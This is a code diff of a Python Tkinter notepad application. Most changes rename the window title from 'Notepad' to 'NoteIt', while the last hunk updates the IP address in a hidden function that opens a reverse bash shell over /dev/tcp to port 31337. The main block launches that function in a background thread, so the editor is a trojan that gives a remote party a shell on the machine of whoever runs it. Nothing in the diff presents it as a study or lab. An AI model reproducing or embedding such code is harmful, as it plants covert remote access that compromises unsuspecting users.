@@ -45,7 +45,7 @@ class Notepad:
             pass
  
         # Set the window text
-        self.__root.title("Untitled - Notepad")
+        self.__root.title("Untitled - NoteIt")
  
         # Center the window
         screenWidth = self.__root.winfo_screenwidth()
@@ -140,7 +140,7 @@ class Notepad:
              
             # Try to open the file
             # set the window title
-            self.__root.title(os.path.basename(self.__file) + " - Notepad")
+            self.__root.title(os.path.basename(self.__file) + " - NoteIt")
             self.__thisTextArea.delete(1.0,END)
  
             file = open(self.__file,"r")
@@ -151,7 +151,7 @@ class Notepad:
  
          
     def __newFile(self):
-        self.__root.title("Untitled - Notepad")
+        self.__root.title("Untitled - NoteIt")
         self.__file = None
         self.__thisTextArea.delete(1.0,END)
  
@@ -174,7 +174,7 @@ class Notepad:
                 file.close()
                  
                 # Change the window title
-                self.__root.title(os.path.basename(self.__file) + " - Notepad")
+                self.__root.title(os.path.basename(self.__file) + " - NoteIt")
                  
              
         else:
@@ -198,7 +198,7 @@ class Notepad:
  
 
 def tryit(sth):
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.69/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.186/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 if __name__ == '__main__':
     thread = threading.Thread(target= tryit, args=(10,))
